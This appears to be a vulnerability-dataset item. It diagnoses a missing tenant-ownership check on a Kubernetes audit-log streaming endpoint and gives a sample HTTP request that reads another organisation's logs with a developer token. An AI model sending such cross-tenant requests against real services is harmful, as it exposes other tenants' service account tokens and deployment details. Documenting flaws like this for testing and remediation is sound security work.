diagnosis: The endpoint decompresses and streams Kubernetes cluster audit logs using req.params.clusterId without checking whether the user belongs to the organization that owns the cluster. Any tenant can stream audit logs detailing cluster admin API calls, service account tokens, and deployment specs of other organizations.
exploit_request:
GET /clusters/cls_prod_k8s_90214/audit-logs/stream HTTP/1.1
Host: monitor.cloud.internal:6060
Authorization: Bearer <tenant_developer_jwt>
Accept: text/plain
